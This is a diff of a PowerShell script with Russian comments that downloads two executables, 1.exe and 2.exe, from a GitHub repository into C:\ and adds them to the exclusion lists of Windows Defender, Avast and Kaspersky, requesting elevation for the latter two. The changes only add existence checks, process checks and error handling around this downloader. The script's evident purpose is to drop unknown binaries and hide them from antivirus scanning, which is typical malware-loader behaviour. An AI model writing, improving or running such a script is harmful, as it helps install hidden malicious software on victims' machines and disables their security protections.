@@ -3,7 +3,28 @@ function Add-To-WindowsDefender-Exclusion {
     param (
         [string]$filePath
     )
-    Add-MpPreference -ExclusionPath $filePath
+
+    # Проверка, существует ли файл
+    if (-Not (Test-Path -Path $filePath)) {
+        Write-Warning "Файл $filePath не найден."
+        return
+    }
+
+    try {
+        # Получаем текущие исключения
+        $currentExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
+
+        # Проверяем, уже добавлен ли файл в исключения
+        if ($currentExclusions -contains $filePath) {
+            Write-Output "Файл $filePath уже добавлен в исключения Windows Defender."
+        } else {
+            # Добавляем файл в исключения
+            Add-MpPreference -ExclusionPath $filePath
+            Write-Output "Файл $filePath успешно добавлен в исключения Windows Defender."
+        }
+    } catch {
+        Write-Error "Ошибка при добавлении файла $filePath в исключения Windows Defender: $_"
+    }
 }
 
 # Функция для добавления файла в исключения Avast Antivirus
@@ -11,7 +32,25 @@ function Add-To-Avast-Exclusion {
     param (
         [string]$filePath
     )
-    Start-Process -FilePath "C:\Program Files\AVAST Software\Avast\avast.exe" -ArgumentList "/exclude add $filePath" -Verb RunAs -Wait
+
+    # Проверка, существует ли файл
+    if (-Not (Test-Path -Path $filePath)) {
+        Write-Warning "Файл $filePath не найден."
+        return
+    }
+
+    try {
+        # Проверяем, запущен ли Avast
+        $avastProcess = Get-Process -Name avast -ErrorAction SilentlyContinue
+        if ($avastProcess) {
+            Start-Process -FilePath "C:\Program Files\AVAST Software\Avast\avast.exe" -ArgumentList "/exclude add $filePath" -Verb RunAs -Wait
+            Write-Output "Файл $filePath успешно добавлен в исключения Avast Antivirus."
+        } else {
+            Write-Warning "Avast Antivirus не запущен."
+        }
+    } catch {
+        Write-Error "Ошибка при добавлении файла $filePath в исключения Avast Antivirus: $_"
+    }
 }
 
 # Функция для добавления файла в исключения Kaspersky Antivirus
@@ -19,7 +58,25 @@ function Add-To-Kaspersky-Exclusion {
     param (
         [string]$filePath
     )
-    Start-Process -FilePath "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Anti-Virus 20.xx\avp.com" -ArgumentList "/add-exclusion=$filePath" -Verb RunAs -Wait
+
+    # Проверка, существует ли файл
+    if (-Not (Test-Path -Path $filePath)) {
+        Write-Warning "Файл $filePath не найден."
+        return
+    }
+
+    try {
+        # Проверяем, запущен ли Kaspersky
+        $kasperskyProcess = Get-Process -Name avp -ErrorAction SilentlyContinue
+        if ($kasperskyProcess) {
+            Start-Process -FilePath "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Anti-Virus 20.xx\avp.com" -ArgumentList "/add-exclusion=$filePath" -Verb RunAs -Wait
+            Write-Output "Файл $filePath успешно добавлен в исключения Kaspersky Antivirus."
+        } else {
+            Write-Warning "Kaspersky Antivirus не запущен."
+        }
+    } catch {
+        Write-Error "Ошибка при добавлении файла $filePath в исключения Kaspersky Antivirus: $_"
+    }
 }
 
 # Пути к файлам
@@ -27,8 +84,19 @@ $file1 = "C:\1.exe"
 $file2 = "C:\2.exe"
 
 # Загрузка файлов
-Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/1.exe" -OutFile $file1
-Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/2.exe" -OutFile $file2
+try {
+    Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/1.exe" -OutFile $file1
+    Write-Output "Файл 1.exe успешно загружен."
+} catch {
+    Write-Error "Ошибка при загрузке файла 1.exe: $_"
+}
+
+try {
+    Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/2.exe" -OutFile $file2
+    Write-Output "Файл 2.exe успешно загружен."
+} catch {
+    Write-Error "Ошибка при загрузке файла 2.exe: $_"
+}
 
 # Добавление в исключения Windows Defender
 Add-To-WindowsDefender-Exclusion -filePath $file1
